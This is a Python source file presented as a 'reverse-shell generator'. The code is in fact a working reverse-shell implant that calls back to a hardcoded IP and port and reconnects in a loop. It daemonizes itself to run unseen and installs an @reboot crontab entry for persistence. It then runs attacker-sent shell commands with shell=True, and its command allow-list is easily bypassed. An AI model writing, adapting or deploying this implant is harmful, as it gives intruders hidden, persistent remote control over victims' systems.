"""
Title: Reverse Shell
Description: Reverse-shell generator tool which will dynamically generate the reverse-shell script or the payload by taking the user ip address as well as the listening port. 
Author: Chris Quinn
"""

import os
import sys
import socket
import subprocess
import platform
import time

SERVER_IP = "192.168.1.153"
SERVER_PORT = 4444
ALLOWED_COMMANDS = ["ls", "pwd", "whoami", "cd", "cat", "echo", "uname", "find", "du"]

def connect_to_server(SERVER_IP, SERVER_PORT):
    while True:  # Looping for reconnection attempts
        try:
            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_connection.connect((SERVER_IP, SERVER_PORT))
            return socket_connection
        except Exception:
            time.sleep(5)  # Wait before trying to reconnect

def send_data(socket_connection, data):
    socket_connection.send((data + "\n> ").encode())  # Send data using the socket

def receive_data(socket_connection, buffer_size):
    response = socket_connection.recv(buffer_size).decode()  # Buffer size
    return response

def change_directory(socket_connection, path):
    try:
        if path:
            os.chdir(path)          # Attempt to change to the specified directory
        else:
            os.chdir(os.path.expanduser("~"))  # Default to home if no directory is specified
        send_data(socket_connection, f"Changed directory to {os.getcwd()}\n")
    except Exception as e:
        send_data(socket_connection, f"cd error: {e}")

def execute_command(socket_connection, command):
    args = command.split()
    if args[0] == "cd":
        change_directory(socket_connection, args[1] if len(args) > 1 else None)     # Second parameter (the path) is None if the command is simply "cd"
    elif args[0] in ALLOWED_COMMANDS:
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
            output, error = result.stdout, result.stderr
            if output:
                send_data(socket_connection, output)
            if error:
                send_data(socket_connection, error)
        except Exception:
            pass  # Silently ignore errors

def terminate_completely(socket_connection):
    try:
        send_data(socket_connection, "Terminating persistence and cleaning up...")
        socket_connection.close()
        # Remove from crontab first
        subprocess.run("crontab -l 2>/dev/null | grep -v 'reverse_shell.py' | crontab - 2>/dev/null", shell=True)
        # Get our own PID and kill -9 ourselves
        pid = os.getpid()
        os.kill(pid, 9)

    except:
        pass

def daemonize():
    if os.fork() > 0:
        sys.exit()
    os.setsid()
    if os.fork() > 0:
        sys.exit()
    with open(os.devnull, 'r') as devnull:
        os.dup2(devnull.fileno(), sys.stdin.fileno())
        os.dup2(devnull.fileno(), sys.stdout.fileno())

def add_cron_persistence():
    try:
        script_path = os.path.abspath(__file__)
        cron_job = f"@reboot python3 {script_path} &"  # Removed \n since we'll check exact match
        
        # Get existing crontab content
        existing_crontab = subprocess.run("crontab -l 2>/dev/null", 
                                        shell=True, 
                                        capture_output=True, 
                                        text=True).stdout
        
        # Check if the exact job command already exists
        if cron_job not in existing_crontab:
            # Only add if exact command doesn't exist
            subprocess.run(f'(echo "{existing_crontab.strip()}\n{cron_job}") | crontab -', 
                         shell=True, check=True)
    except subprocess.CalledProcessError:
        pass

if __name__ == "__main__":
    daemonize()  # Daemonize early for background operation
    os_type = platform.system()
    if os_type == "Linux":
        add_cron_persistence()

    while True:  # Main reconnection loop
        try:
            socket_connection = connect_to_server(SERVER_IP, SERVER_PORT)
            send_data(socket_connection, f"Connection established. Operating System: {os_type}")

            while True:  # Command loop
                command = receive_data(socket_connection, 1024)
                if command.lower().strip() == "terminate":
                  terminate_completely(socket_connection)
                else:
                    execute_command(socket_connection, command)

        except Exception:
            time.sleep(5)
            continue